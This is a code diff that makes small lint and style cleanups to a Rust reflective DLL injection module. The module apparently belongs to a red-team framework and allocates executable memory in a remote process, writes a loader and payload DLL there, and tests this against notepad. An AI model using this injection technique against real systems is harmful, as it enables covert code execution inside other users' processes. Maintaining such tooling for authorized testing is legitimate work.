@@ -128,7 +128,7 @@ fn virtual_alloc_ex(
 ) -> anyhow::Result<*mut c_void> {
     let buffer_handle: *mut c_void =
         unsafe { VirtualAllocEx(hprocess, lpaddress, dwsize, flallocationtype, flprotect) };
-    if buffer_handle == null_mut() {
+    if buffer_handle.is_null() {
         let error_code = unsafe { GetLastError() };
         if error_code != 0 {
             return Err(anyhow::anyhow!(
@@ -253,6 +253,7 @@ fn get_export_address_by_name(
     Err(anyhow::anyhow!("Function {} not found", export_name))
 }
 
+#[allow(dead_code)] // `function_offset` is never read in our code but does get passed to our remote process.
 #[cfg(target_os = "windows")]
 struct UserData {
     function_offset: u64,
@@ -282,7 +283,7 @@ fn handle_dll_reflect(
     let remote_buffer = virtual_alloc_ex(
         process_handle,
         null_mut(),
-        image_size as usize,
+        image_size,
         MEM_COMMIT | MEM_RESERVE,
         PAGE_EXECUTE_READWRITE,
     )?;
@@ -291,7 +292,7 @@ fn handle_dll_reflect(
         process_handle,
         remote_buffer as _,
         reflective_loader_dll.as_ptr() as _,
-        image_size as usize,
+        image_size,
     )?;
 
     // Allocate and write user data to the remote process
@@ -316,7 +317,7 @@ fn handle_dll_reflect(
     let remote_buffer_target_dll: *mut std::ffi::c_void = virtual_alloc_ex(
         process_handle,
         null_mut(),
-        user_data_ptr_size + target_dll_bytes.len() as usize,
+        user_data_ptr_size + target_dll_bytes.len(),
         MEM_COMMIT | MEM_RESERVE,
         PAGE_EXECUTE_READWRITE,
     )?;
@@ -337,7 +338,7 @@ fn handle_dll_reflect(
         process_handle,
         payload_ptr_in_remote_buffer as _,
         target_dll_bytes.as_slice().as_ptr() as _,
-        target_dll_bytes.len() as usize,
+        target_dll_bytes.len(),
     )?;
 
     // Find the loader entrypoint and hand off execution
@@ -485,7 +486,7 @@ mod tests {
         let target_pid = expected_process.unwrap().id();
 
         // Run our code.
-        let _res = handle_dll_reflect(test_dll_bytes.to_vec(), target_pid, "demo_init")?;
+        handle_dll_reflect(test_dll_bytes.to_vec(), target_pid, "demo_init")?;
 
         let delay = time::Duration::from_secs(DLL_EXEC_WAIT_TIME);
         thread::sleep(delay);
@@ -500,11 +501,8 @@ mod tests {
         // kill the target process notepad
         let mut sys = System::new();
         sys.refresh_processes();
-        match sys.process(Pid::from_u32(target_pid)) {
-            Some(res) => {
-                res.kill_with(Signal::Kill);
-            }
-            None => {}
+        if let Some(res) = sys.process(Pid::from_u32(target_pid)) {
+            res.kill_with(Signal::Kill);
         }
         Ok(())
     }
@@ -524,14 +522,11 @@ mod tests {
             .spawn();
         let target_pid = expected_process.unwrap().id() as i32;
 
-        let test_eldritch_script = format!(
-            r#"
+        let test_eldritch_script = r#"
 func_dll_reflect(input_params['dll_bytes'], input_params['target_pid'], "demo_init")
-"#
-        );
+"#.to_string();
 
-        let ast: AstModule;
-        match AstModule::parse(
+        let ast = match AstModule::parse(
             "test.eldritch",
             test_eldritch_script.to_owned(),
             &Dialect {
@@ -539,9 +534,9 @@ func_dll_reflect(input_params['dll_bytes'], input_params['target_pid'], "demo_in
                 ..Dialect::Extended
             },
         ) {
-            Ok(res) => ast = res,
+            Ok(res) => res,
             Err(err) => return Err(err.into_anyhow()),
-        }
+        };
 
         #[starlark_module]
         fn func_dll_reflect(builder: &mut GlobalsBuilder) {
@@ -599,11 +594,8 @@ func_dll_reflect(input_params['dll_bytes'], input_params['target_pid'], "demo_in
         // kill the target process notepad
         let mut sys = System::new();
         sys.refresh_processes();
-        match sys.process(Pid::from_u32(target_pid as u32)) {
-            Some(res) => {
-                res.kill_with(Signal::Kill);
-            }
-            None => {}
+        if let Some(res) = sys.process(Pid::from_u32(target_pid as u32)) {
+            res.kill_with(Signal::Kill);
         }
         Ok(())
     }
